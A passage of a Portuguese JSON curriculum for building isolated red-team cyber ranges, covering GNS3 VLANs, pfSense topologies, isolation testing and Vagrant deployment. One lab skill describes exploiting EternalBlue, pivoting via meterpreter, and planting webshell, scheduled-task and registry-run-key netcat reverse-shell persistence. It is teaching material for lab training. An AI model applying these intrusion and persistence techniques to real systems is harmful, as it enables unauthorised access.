                                    "Conecte as portas: configure portas de acesso e uma porta trunk entre os switches.",
                                    "Inicie todos os dispositivos e acesse o console dos switches via CLI."
                                  ],
                                  "verification": "Verifique se todos os dispositivos estão online e respondendo a pings básicos no GNS3 console.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GNS3 instalado",
                                    "Imagens de switches IOL ou VPCS",
                                    "Computador com pelo menos 8GB RAM"
                                  ],
                                  "tips": "Use templates pré-configurados no GNS3 para switches IOL para economizar tempo.",
                                  "learningObjective": "Configurar um ambiente de simulação básico pronto para VLANs.",
                                  "commonMistakes": [
                                    "Não alocar RAM suficiente levando a crashes",
                                    "Esquecer de iniciar dispositivos antes de configurar"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar e Nomear VLANs nos Switches Virtuais",
                                  "subSteps": [
                                    "Entre no modo de configuração global: 'enable' > 'configure terminal'.",
                                    "Crie VLAN 10: 'vlan 10' > 'name Servidores', saia com 'exit'.",
                                    "Crie VLAN 20: 'vlan 20' > 'name Estacoes', saia com 'exit'.",
                                    "Salve a configuração: 'write memory' e verifique com 'show vlan brief'."
                                  ],
                                  "verification": "Comando 'show vlan brief' lista VLAN 10 e 20 com status active.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Acesso CLI ao switch virtual no GNS3"
                                  ],
                                  "tips": "Sempre use 'do show vlan brief' no modo config para verificar sem sair.",
                                  "learningObjective": "Dominar comandos básicos de criação e verificação de VLANs.",
                                  "commonMistakes": [
                                    "Esquecer de nomear VLANs ou salvar config",
                                    "Criar VLANs com IDs inválidos (acima 4094)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Portas de Acesso e Trunking",
                                  "subSteps": [
                                    "Atribua portas de acesso: 'interface fastEthernet 0/1' > 'switchport mode access' > 'switchport access vlan 10' para servidor.",
                                    "Para estações: 'interface fastEthernet 0/2' > 'switchport mode access' > 'switchport access vlan 20'.",
                                    "Configure trunk: 'interface fastEthernet 0/3' > 'switchport mode trunk' > 'switchport trunk allowed vlan 10,20'.",
                                    "Repita no segundo switch e salve configurações."
                                  ],
                                  "verification": "'show interfaces trunk' e 'show interfaces switchport' confirmam modos e VLANs permitidas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Diagrama de rede simples"
                                  ],
                                  "tips": "Use 'switchport trunk native vlan 1' se necessário para evitar loops.",
                                  "learningObjective": "Aplicar segmentação de tráfego via portas de acesso e trunk.",
                                  "commonMistakes": [
                                    "Configurar trunk sem allowed vlans levando a isolamento total",
                                    "Misturar modos access/trunk"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Isolamento e Conectividade das VLANs",
                                  "subSteps": [
                                    "Atribua IPs: Servidor (VLAN10): 192.168.10.10/24; Estação (VLAN20): 192.168.20.10/24.",
                                    "Teste intra-VLAN: ping do servidor para outro em VLAN10 deve succeed.",
                                    "Teste inter-VLAN: ping de VLAN10 para VLAN20 deve falhar (isolamento).",
                                    "Verifique trunk com 'show mac address-table' para tráfego cross-switch."
                                  ],
                                  "verification": "Pings intra-VLAN OK, inter-VLAN falha; MAC tables mostram aprendizado por VLAN.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramentas VPCS no GNS3 para ping/IP config"
                                  ],
                                  "tips": "Use 'debug vlan packets' para troubleshooting se necessário.",
                                  "learningObjective": "Validar eficácia da segmentação VLAN em simulações Red Team.",
                                  "commonMistakes": [
                                    "IPs em sub-redes erradas",
                                    "Não testar isolamento levando a falsos positivos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação Red Team no GNS3, configure VLAN 10 para isolar servidores alvo (IPs 192.168.10.0/24) e VLAN 20 para estações de ataque (192.168.20.0/24). Use trunk na porta Gi0/1 entre Switch1 e Switch2 para permitir tráfego segmentado, simulando uma rede corporativa onde atacantes em VLAN20 tentam acessar VLAN10 sem roteamento.",
                              "finalVerifications": [
                                "'show vlan brief' lista VLANs 10 e 20 ativas em ambos switches.",
                                "Portas de acesso atribuídas corretamente via 'show interfaces switchport'.",
                                "Trunk operacional com VLANs 10,20 permitidas via 'show interfaces trunk'.",
                                "Pings intra-VLAN bem-sucedidos; inter-VLAN falham confirmando isolamento.",
                                "Tabelas MAC mostram endereços aprendidos por VLAN correta.",
                                "'show running-config | include vlan' confirma persistência."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos comandos VLAN e interface (sem erros de sintaxe).",
                                "Configuração correta de trunk com VLANs específicas permitidas.",
                                "Demonstração de isolamento via testes de conectividade.",
                                "Eficiência no tempo: completar em <80 minutos totais.",
                                "Documentação de verificações com screenshots de 'show' commands.",
                                "Aplicação contextual a cenários Red Team (explicação de uso)."
                              ],
                              "crossCurricularConnections": [
                                "Redes (CCNA): Fundamentos de switching e L2 segmentation.",
                                "Segurança Cibernética: Isolamento para simulações de pentest sem contaminação.",
                                "Programação de Rede: Integração com Ansible para automação VLAN.",
                                "Sistemas Operacionais: Configuração de interfaces virtuais no Linux (ex: netplan).",
                                "Jogos de Guerra: Uso em labs CTF para topologias segmentadas."
                              ],
                              "realWorldApplication": "Em operações Red Team, VLANs virtuais isolam ambientes de teste (ex: servidores vulneráveis em VLAN10) de estações de comando (VLAN20), prevenindo vazamento de tráfego malicioso para redes de produção durante simulações de ataque em ferramentas como GNS3 ou EVE-NG."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.2.3",
                            "name": "Simular Topologias Híbridas",
                            "description": "Construir topologias com firewalls virtuais (ex: pfSense) entre segmentos para testar pivoting e persistência em ambientes de jogos cibernéticos isolados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejar a Topologia Híbrida",
                                  "subSteps": [
                                    "Defina os segmentos de rede: DMZ, Internal e External.",
                                    "Especifique VMs: uma para alvo DMZ (ex: Ubuntu com serviço vulnerável), uma para Internal (Windows Server), pfSense como firewall.",
                                    "Desenhe diagrama com ferramentas como Draw.io, indicando interfaces e fluxos de tráfego esperados.",
                                    "Planeje regras iniciais: permitir HTTP na DMZ, bloquear acesso direto à Internal.",
                                    "Liste objetivos de teste: pivoting via exploit e persistência com backdoor."
                                  ],
                                  "verification": "Diagrama completo aprovado e compartilhado em documento ou imagem.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação (Draw.io ou Lucidchart)",
                                    "Papel e caneta para esboço inicial"
                                  ],
                                  "tips": [
                                    "Considere assimetrias de rede para simular cenários reais.",
                                    "Inclua logging para análise posterior."
                                  ],
                                  "learningObjective": "Compreender componentes e fluxos em topologias híbridas para simulação de ataques.",
                                  "commonMistakes": [
                                    "Ignorar rotas de retorno.",
                                    "Subestimar número de interfaces no firewall."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente Virtual Isolado",
                                  "subSteps": [
                                    "Instale hypervisor (ex: VirtualBox, VMware Workstation ou Proxmox).",
                                    "Crie redes virtuais isoladas: NAT para External, Internal Network para segmentos.",
                                    "Configure 3-4 VMs: pfSense (2 NICs), DMZ VM, Internal VM.",
                                    "Atribua IPs estáticos: pfSense WAN (192.168.1.1), LAN (10.0.0.1), DMZ (172.16.0.1).",
                                    "Teste conectividade básica entre VMs via ping."
                                  ],
                                  "verification": "Todas VMs bootam e ping entre interfaces adjacentes funciona.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Hypervisor instalado",
                                    "Imagens ISO: pfSense, Ubuntu, Windows Server"
                                  ],
                                  "tips": [
                                    "Use snapshots antes de configurações críticas.",
                                    "Desative firewall host para evitar interferências."
                                  ],
                                  "learningObjective": "Dominar configuração de redes virtuais segmentadas para isolamento.",
                                  "commonMistakes": [
                                    "Configurar redes bridged em vez de internal.",
                                    "Esquecer de habilitar promiscuous mode nas NICs."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar e Configurar pfSense como Firewall Virtual",
                                  "subSteps": [
                                    "Instale pfSense na VM dedicada via ISO.",
                                    "Configure interfaces: WAN (External), LAN (Internal), OPT1 (DMZ).",
                                    "Acesse web GUI (https://IP_pfSense) e configure usuários admin.",
                                    "Habilite DHCP por segmento e defina gateways.",
                                    "Configure NAT outbound e firewall básico (bloquear tudo, permitir WAN->DMZ HTTP)."
                                  ],
                                  "verification": "Acesso GUI funcional e DHCP aloca IPs corretamente nas VMs.",
                                  "estimatedTime": "45 minutos - 1 hora",
                                  "materials": [
                                    "ISO pfSense oficial",
                                    "Navegador web"
                                  ],
                                  "tips": [
                                    "Use senhas fortes e habilite 2FA se possível.",
                                    "Monitore logs em Status > System Logs."
                                  ],
                                  "learningObjective": "Aprender instalação e setup inicial de firewalls virtuais em cenários híbridos.",
                                  "commonMistakes": [
                                    "Invertar ordem de interfaces WAN/LAN.",
                                    "Não salvar configurações (Apply Changes)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Segmentação e Regras de Firewall",
                                  "subSteps": [
                                    "Crie aliases para redes: DMZ_NET, INTERNAL_NET.",
                                    "Adicione regras: Permitir External->DMZ:80/443; Bloquear External->Internal; Permitir DMZ->Internal ICMP (para teste pivoting).",
                                    "Configure logging em regras críticas.",
                                    "Teste regras: ping de External para DMZ (OK), para Internal (bloqueado).",
                                    "Adicione regra condicional para simular pivoting (ex: após exploit, permitir SSH DMZ->Internal)."
                                  ],
                                  "verification": "Tráfego segue regras definidas, logs mostram bloqueios/permissões.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Interface web pfSense",
                                    "Ferramentas de teste: ping, nmap"
                                  ],
                                  "tips": [
                                    "Regras são processadas top-down; ordem importa.",
                                    "Use floating rules para tráfego avançado."
                                  ],
                                  "learningObjective": "Configurar políticas de firewall para simular controles de acesso em topologias híbridas.",
                                  "commonMistakes": [
                                    "Regras muito permissivas vazando tráfego.",
                                    "Esquecer anti-lockout rule."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar Pivoting e Persistência",
                                  "subSteps": [
                                    "Explore vuln na DMZ (ex: EternalBlue ou SSH fraco).",
                                    "Ganhe shell na DMZ e pivote para Internal via regra permitida (ssh tunnel ou meterpreter).",
                                    "Instale backdoor na Internal (ex: webshell ou scheduled task).",
                                    "Reinicie VMs e verifique persistência do backdoor.",
                                    "Documente captura de flag ou acesso a dados simulados."
                                  ],
                                  "verification": "Pivoting bem-sucedido, persistência mantida pós-reboot, sem vazamentos.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramentas pentest: Metasploit, Nmap, SSH client",
                                    "Payloads para persistência"
                                  ],
                                  "tips": [
                                    "Use Proxies/SOCKS para pivoting realista.",
                                    "Registre todos comandos em log."
                                  ],
                                  "learningObjective": "Validar eficácia de topologias híbridas em cenários de ataque Red Team.",
                                  "commonMistakes": [
                                    "Expor serviços desnecessários.",
                                    "Não testar reinicialização para persistência."
                                  ]
                                }
                              ],
                              "practicalExample": "Simule uma rede corporativa: VM External (Kali attacker) acessa webapp vulnerável na DMZ (Metasploitable), pivota via pfSense (regra SSH permitida DMZ->Internal) para Windows Server Internal, instala netcat reverse shell persistente via registry run key. Verifique acesso a 'flag.txt' na Internal.",
                              "finalVerifications": [
                                "Topologia híbrida com 3+ segmentos isolados funcionando.",
                                "Firewall pfSense bloqueia tráfego não autorizado entre External e Internal.",
                                "Pivoting de DMZ para Internal possível apenas após exploração.",
                                "Persistência mantida após reboot de VMs alvo.",
                                "Logs do pfSense registram tentativas de pivoting.",
                                "Nenhum tráfego vaza para fora do ambiente isolado."
                              ],
                              "assessmentCriteria": [
                                "Precisão do diagrama e planejamento (100% match com implementação).",
                                "Configuração correta de interfaces e regras no pfSense (sem erros de roteamento).",
                                "Sucesso em pivoting e persistência sem comprometer isolamento.",
                                "Documentação completa de testes e logs.",
                                "Tempo de execução dentro do estimado com eficiência.",
                                "Identificação e correção de pelo menos 2 erros comuns durante o processo."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores (roteamento, NAT, VLANs)",
                                "Virtualização e Hipervisores (VMware, KVM)",
                                "Testes de Penetração (Metasploit, pivoting techniques)",
                                "Administração de Sistemas (configuração de serviços persistentes)",
                                "Análise Forense (logs de firewall e rede)"
                              ],
                              "realWorldApplication": "Em operações de Red Team e Cyber Ranges, essa simulação treina detecção de pivoting lateral em ambientes corporativos híbridos (on-prem + cloud), preparando defesas contra persistência em infraestruturas segmentadas com firewalls como pfSense ou AWS Transit Gateway."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.2.3",
                        "name": "Ferramentas Especializadas e Validação de Isolamento",
                        "description": "Uso de plataformas dedicadas para jogos cibernéticos e verificação de isolamento para garantir conformidade com regras de engajamento Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.2.3.1",
                            "name": "Instalar e Configurar GNS3 ou EVE-NG",
                            "description": "Configurar GNS3 para emular dispositivos de rede reais (routers Cisco, switches) em topologias complexas isoladas, integrando com VMs para cenários de ataque cibernético.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e instalar GNS3 All-in-One",
                                  "subSteps": [
                                    "Verifique requisitos mínimos: 16GB RAM, CPU multi-core, 100GB disco livre e hypervisor como VirtualBox ou VMware Workstation/Player instalado.",
                                    "Baixe a versão All-in-One mais recente do site oficial gns3.com (para Windows/Linux/Mac).",
                                    "Execute o instalador e siga o wizard, selecionando componentes padrão incluindo QEMU e Dynamips.",
                                    "Inicie o GNS3 e configure o caminho para o hypervisor durante o setup inicial.",
                                    "Teste a interface abrindo um novo projeto vazio."
                                  ],
                                  "verification": "GNS3 abre sem erros de dependências e exibe a tela principal com barra de ferramentas funcional.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Computador com specs mínimas",
                                    "Download GNS3 All-in-One",
                                    "VirtualBox ou VMware instalado"
                                  ],
                                  "tips": "Use All-in-One para iniciantes; evite instalação manual para reduzir erros.",
                                  "learningObjective": "Compreender e satisfazer pré-requisitos de hardware/software para emulação de rede.",
                                  "commonMistakes": [
                                    "Subestimar RAM causando crashes",
                                    "Pular instalação do hypervisor",
                                    "Usar versão server sem GUI"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Obter e configurar imagens de dispositivos de rede",
                                  "subSteps": [
                                    "Adquira imagens IOS Cisco legais (ex: IOSv via Cisco VIRL ou trial; alternativas open-source como IOL para switches).",
                                    "No GNS3, vá para Edit > Preferences > IOS Routers > New > Importe a imagem .qcow2 ou .bin.",
                                    "Configure templates: defina RAM (512MB para IOSv), CPUs (1-2), console type (Telnet).",
                                    "Repita para switches (IOU) e outros appliances como Wireshark built-in.",
                                    "Salve templates e teste arrastando um router para o workspace."
                                  ],
                                  "verification": "Dispositivo inicia no console sem erros de licença ou imagem corrompida; comando 'show version' exibe info correta.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Imagens IOS Cisco válidas (.qcow2/.bin)",
                                    "Conta Cisco para downloads",
                                    "Espaço disco 20GB+"
                                  ],
                                  "tips": "Use imagens L3 para routers; teste compatibilidade com versão GNS3 antes.",
                                  "learningObjective": "Aprender a importar e parametrizar appliances para emulação fiel.",
                                  "commonMistakes": [
                                    "Imagens piratas com checksum inválido",
                                    "Configurar RAM excessiva causando lentidão",
                                    "Ignorar setup de console"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar integração com VMs para cenários híbridos",
                                  "subSteps": [
                                    "Instale VM manager no Preferences > VMware/VirtualBox > Edit e aponte para instalação.",
                                    "Crie VMs base (ex: Ubuntu 20.04 via GNS3 VM ou manual): importe OVA do site GNS3.",
                                    "Configure rede da VM para bridged ou NAT no hypervisor, mas isole via GNS3 cloud node.",
                                    "Adicione VM ao template library: defina RAM (4GB), rede adapters (2+ para mgmt/attack).",
                                    "Teste conectividade: link VM a um router via Ethernet hub."
                                  ],
                                  "verification": "VM inicia no GNS3, ping responde entre VM e dispositivo de rede emulado.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "GNS3 VM OVA",
                                    "Hypervisor licenciado",
                                    "ISO Ubuntu para custom VMs"
                                  ],
                                  "tips": "Use GNS3 VM pré-configurada para economia de tempo; habilite nested virtualization se necessário.",
                                  "learningObjective": "Integrar emulação de rede com virtualização para labs realistas.",
                                  "commonMistakes": [
                                    "VM sem adapters de rede",
                                    "Conflito de hypervisors",
                                    "Nested virt não habilitado em BIOS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar e configurar topologias complexas isoladas",
                                  "subSteps": [
                                    "Crie novo projeto: adicione 2+ routers IOSv, switch IOU, firewall e VM atacante (Kali).",
                                    "Conecte via links Ethernet/Serial; configure VLANs e sub-redes isoladas (ex: 192.168.x.x).",
                                    "Use cloud node para simular Internet mas bloqueie com firewall rules para isolamento.",
                                    "Salve configuração como .gns3project; startup configs nos dispositivos.",
                                    "Inicie todos e teste: ping end-to-end, traceroute sem vazamento."
                                  ],
                                  "verification": "Topologia toda up/green; tráfego flui internamente mas sem saída para host real (verifique com tcpdump).",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Templates prontos",
                                    "Ferramentas Wireshark/Cisco CLI"
                                  ],
                                  "tips": "Use drag-and-drop para links; snapshot projetos para rollback rápido.",
                                  "learningObjective": "Construir redes multi-dispositivo para simular cenários de ataque cibernético.",
                                  "commonMistakes": [
                                    "Loops de broadcast sem STP",
                                    "Sub-redes sobrepostas",
                                    "Cloud node exposto causando vazamento"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar isolamento e preparar para jogos de guerra",
                                  "subSteps": [
                                    "Desative promiscuous mode em adapters; configure host-only ou internal network no hypervisor.",
                                    "Teste isolamento: de VM Kali, scan nmap para host real (deve falhar); verifique iptables/firewalld.",
                                    "Monitore recursos: CPU/RAM <80%; ajuste se necessário.",
                                    "Adicione tools: integre Metasploit na VM, teste ataque simulado (ex: ARP spoof).",
                                    "Documente setup em README do projeto; exporte para backup."
                                  ],
                                  "verification": "Nenhum tráfego sai do lab (confirmar com Wireshark no host); ataques simulados funcionam internamente.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "nmap, Wireshark em VM",
                                    "Kali Linux VM image"
                                  ],
                                  "tips": "Use GNS3 console para logs centralizados; teste em máquina dedicada para performance.",
                                  "learningObjective": "Garantir segurança e isolamento para treinamentos Red Team sem riscos reais.",
                                  "commonMistakes": [
                                    "Firewall host não bloqueando portas GNS3",
                                    "Promiscuous mode ativado",
                                    "Sobrecarga de recursos crashando lab"
                                  ]
                                }
                              ],
                              "practicalExample": "Monte uma topologia Red Team: 2 routers Cisco IOSv conectados via OSPF, switch L2 com VLANs, VM Kali como atacante e VM Windows vítima. Configure rotas isoladas (10.0.0.0/8), teste scan Nmap da Kali para vítima (sucesso), mas falha para rede real do host. Simule exploit Metasploit sem vazamento.",
                              "finalVerifications": [
                                "GNS3 e todos appliances iniciam sem crashes por 30 minutos.",
                                "Conectividade full-mesh interna via ping/traceroute.",
                                "Zero tráfego detectado saindo do lab (Wireshark no host).",
                                "VMs integradas respondem a comandos de rede dos routers.",
                                "Recursos do host estáveis (CPU <70%, RAM livre >20%).",
                                "Projeto salva e exportável com todas configs persistentes."
                              ],
                              "assessmentCriteria": [
                                "Tempo total de setup <6 horas com topologia funcional.",
                                "Isolamento 100%: nenhum ping/nmap para fora do lab.",
                                "Estabilidade: lab roda 1h sem intervenção.",
                                "Fidelidade: comandos Cisco/VM comportam como hardware real.",
                                "Documentação: README com topologia, IPs e testes.",
                                "Escalabilidade: adicionar dispositivo novo em <10min."
                              ],
                              "crossCurricularConnections": [
                                "Redes Fundamentais (CCNA): configuração OSPF/BGP em emuladores.",
                                "Virtualização e Cloud: integração com AWS VPC ou Proxmox para labs híbridos.",
                                "Programação/Python: automação via GNS3 API para provisionar topologias.",
                                "Segurança Aplicada: simulação de pentest com tools como Nmap/Metasploit.",
                                "Sistemas Operacionais: tuning de Linux VMs para performance emulação."
                              ],
                              "realWorldApplication": "Em operações Red Team e CTFs (Capture The Flag), profissionais de cibersegurança usam GNS3/EVE-NG para montar labs isolados reproduzindo infra corporativa, testando ataques como MITM ou ransomware sem expor redes reais, acelerando treinamento e validação de defesas."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.3.2",
                            "name": "Testar Isolamento de Rede",
                            "description": "Executar scans (Nmap, Wireshark) internamente para validar ausência de vazamento externo, monitorando tráfego com ferramentas como tcpdump para confirmar segmentação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente de Teste e Ferramentas",
                                  "subSteps": [
                                    "Configurar uma rede virtual isolada usando VirtualBox ou VMware com pelo menos duas VMs: uma para teste (interna) e uma simulando rede externa.",
                                    "Instalar Nmap, Wireshark e tcpdump na VM de teste (ex: sudo apt install nmap wireshark tcpdump).",
                                    "Verificar permissões: habilitar modo promiscuous na interface de rede da VM e rodar Wireshark/tcpdump como root.",
                                    "Definir regras de firewall para bloquear todo tráfego externo (ex: iptables -P OUTPUT DROP).",
                                    "Testar conectividade interna básica entre VMs da mesma rede isolada."
                                  ],
                                  "verification": "Ambiente configurado com ferramentas instaladas e firewall ativo; comando 'nmap localhost' retorna resultados locais sem erros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "VMs com Linux (Ubuntu/Debian)",
                                    "Nmap",
                                    "Wireshark",
                                    "tcpdump"
                                  ],
                                  "tips": "Use snapshots das VMs para reset rápido após testes; documente IPs e interfaces de rede.",
                                  "learningObjective": "Configurar um ambiente isolado pronto para testes de segmentação de rede.",
                                  "commonMistakes": [
                                    "Esquecer de instalar dependências como libpcap para Wireshark",
                                    "Não habilitar modo promiscuous, causando perda de pacotes",
                                    "Configurar firewall incorreto permitindo tráfego acidental"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar Scans Internos com Nmap",
                                  "subSteps": [
                                    "Executar scan de descoberta de hosts: nmap -sn 192.168.1.0/24 (ajustar para rede isolada).",
                                    "Realizar scan de portas: nmap -p- -T4 <IP_externo_simulado> da VM interna.",
                                    "Usar scan SYN stealth: nmap -sS -O <IP_externo> para detectar SO e serviços.",
                                    "Salvar saída em arquivo: nmap -oN scan_isolamento.txt <IP_externo>.",
                                    "Comparar resultados: verificar se apenas hosts internos são detectados."
                                  ],
                                  "verification": "Relatório Nmap mostra 'Host seems down' ou timeout para IPs externos; nenhum host fora da rede isolada listado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Lista de IPs externos simulados (ex: 8.8.8.8, google.com)"
                                  ],
                                  "tips": "Aumente timeout com --host-timeout 30s para redes lentas; use -v para verbose output.",
                                  "learningObjective": "Dominar comandos Nmap para validar ausência de conectividade externa.",
                                  "commonMistakes": [
                                    "Usar scan agressivo (-A) que pode gerar ruído desnecessário",
                                    "Interpretar timeouts como falha de ferramenta em vez de isolamento",
                                    "Não salvar logs para auditoria"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Monitorar Tráfego com Wireshark e tcpdump",
                                  "subSteps": [
                                    "Iniciar captura no Wireshark: selecionar interface (ex: eth0) e filtro 'ip.dst != rede_isolada'.",
                                    "Rodar tcpdump em terminal: sudo tcpdump -i eth0 -w trafego_isolado.pcap host not 192.168.1.0/24.",
                                    "Gerar tráfego interno simulado: ping <IP_interno>, wget <site_interno>.",
                                    "Tentar tráfego externo: ping 8.8.8.8 ou curl google.com e capturar.",
                                    "Parar captura após 5 minutos e aplicar filtros para pacotes de saída."
                                  ],
                                  "verification": "Capturas mostram zero pacotes com dst_host externo; filtros confirmam ausência de vazamento.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "tcpdump",
                                    "Scripts para gerar tráfego simulado"
                                  ],
                                  "tips": "Use filtros display no Wireshark como 'ip.src == VM_IP and ip.dst not in rede_isolada'; salve pcaps para análise posterior.",
                                  "learningObjective": "Capturar e analisar tráfego para confirmar segmentação de rede.",
                                  "commonMistakes": [
                                    "Não filtrar corretamente, confundindo tráfego broadcast",
                                    "Rodar sem root, perdendo pacotes raw",
                                    "Ignorar tráfego DNS que pode vazar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Resultados e Validar Isolamento",
                                  "subSteps": [
                                    "Analisar logs Nmap: grep 'down' scan_isolamento.txt e verificar timeouts.",
                                    "Abrir pcaps no Wireshark: estatísticas > Conversations > IPv4 para IPs externos (deve ser vazio).",
                                    "Executar tcpdump -r trafego_isolado.pcap | grep 'external_ip' (nenhum resultado).",
                                    "Testar cenários de bypass: tentar DNS tunneling ou ICMP redirects.",
                                    "Documentar relatório: screenshots, logs e conclusão de isolamento confirmado."
                                  ],
                                  "verification": "Relatório final assinado confirma ausência total de vazamento; testes de bypass falham.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Logs Nmap",
                                    "Arquivos .pcap",
                                    "Editor de texto para relatório"
                                  ],
                                  "tips": "Automatize análise com scripts awk/grep; valide com múltiplas ferramentas para confiabilidade.",
                                  "learningObjective": "Interpretar dados de scans e capturas para validar efetividade do isolamento.",
                                  "commonMistakes": [
                                    "Focar só em pacotes TCP, ignorando UDP/ICMP",
                                    "Concluir isolamento prematuro sem testes de bypass",
                                    "Não documentar evidências para auditoria"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, configure duas VMs isoladas (192.168.56.0/24). Da VM 'atacante', rode nmap -sn 8.8.8.8 (deve timeout). Capture com tcpdump durante ping 1.1.1.1 - zero pacotes saem. Analise pcap: confirme isolamento antes de simular ataque.",
                              "finalVerifications": [
                                "Nmap não detecta hosts externos (timeouts em todos scans).",
                                "Wireshark/tcpdump capturam zero pacotes de saída para fora da rede isolada.",
                                "Testes de bypass (DNS, ICMP) falham sem vazamento.",
                                "Firewall logs mostram drops de tentativas externas.",
                                "Relatório documentado com evidências (logs/screenshots).",
                                "Repetição do teste em snapshot limpo confirma consistência."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude dos comandos Nmap/Wireshark/tcpdump (sem erros sintáticos).",
                                "Interpretação correta de resultados (identifica ausência de vazamento).",
                                "Cobertura de múltiplos protocolos (TCP/UDP/ICMP/DNS).",
                                "Documentação clara com evidências visuais e logs.",
                                "Tempo de execução dentro do estimado e eficiência nos substeps.",
                                "Identificação e mitigação de erros comuns durante o processo."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Compreensão de camadas OSI e segmentação VLAN.",
                                "Análise de Dados: Interpretação de logs e filtros em ferramentas de captura.",
                                "Programação: Automação de scans com scripts Bash/Python (Scapy).",
                                "Segurança de Sistemas: Configuração de firewalls (iptables/ufw).",
                                "Gestão de Projetos: Documentação de relatórios de validação."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou pentests, valida isolamento de labs virtuais para evitar vazamento de tráfego sensível para redes de produção, garantindo conformidade com regulamentações como GDPR ou NIST e prevenindo incidentes reais de exposição."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.3.3",
                            "name": "Documentar e Automatizar Deployments",
                            "description": "Criar scripts (Vagrant, Ansible) para deploy rápido de topologias isoladas, documentando configurações para reprodutibilidade em operações Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir e Documentar a Topologia de Rede Isolada",
                                  "subSteps": [
                                    "Analise os requisitos da operação Red Team: identifique VMs necessárias (ex: attacker, victim, defender).",
                                    "Desenhe um diagrama da topologia usando ferramentas como Draw.io ou Lucidchart, especificando interfaces de rede isoladas.",
                                    "Defina configurações de rede: subnets privadas, bridges virtuais e regras de firewall para isolamento.",
                                    "Crie um documento inicial (Markdown ou README.md) com diagrama, IPs, portas e dependências.",
                                    "Valide o diagrama com stakeholders para garantir alinhamento com objetivos do jogo cibernético."
                                  ],
                                  "verification": "Diagrama e documento inicial revisados e aprovados, sem ambiguidades nos requisitos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Draw.io ou Lucidchart",
                                    "Editor de texto (VS Code)",
                                    "Requisitos da operação Red Team"
                                  ],
                                  "tips": "Use templates de topologias Red Team prontas para acelerar o processo.",
                                  "learningObjective": "Compreender e mapear topologias isoladas para reprodutibilidade em cenários de simulação.",
                                  "commonMistakes": [
                                    "Ignorar isolamento de rede levando a vazamentos",
                                    "Documentação vaga sem IPs específicos",
                                    "Não considerar escalabilidade para múltiplas instâncias"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver Script Vagrant para Provisionamento de VMs",
                                  "subSteps": [
                                    "Instale Vagrant e VirtualBox/VMware em ambiente de desenvolvimento.",
                                    "Crie Vagrantfile base com definições de VMs: boxes (ex: ubuntu/focal64), memória, CPUs e redes privadas.",
                                    "Configure redes isoladas: private_network com IP fixo e host-only para comunicação controlada.",
                                    "Adicione provisioners básicos no Vagrantfile para instalação inicial de dependências.",
                                    "Teste 'vagrant up' para validar provisionamento sem erros."
                                  ],
                                  "verification": "Comando 'vagrant up' completa sem falhas e VMs iniciam com rede isolada confirmada via 'vagrant ssh'.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
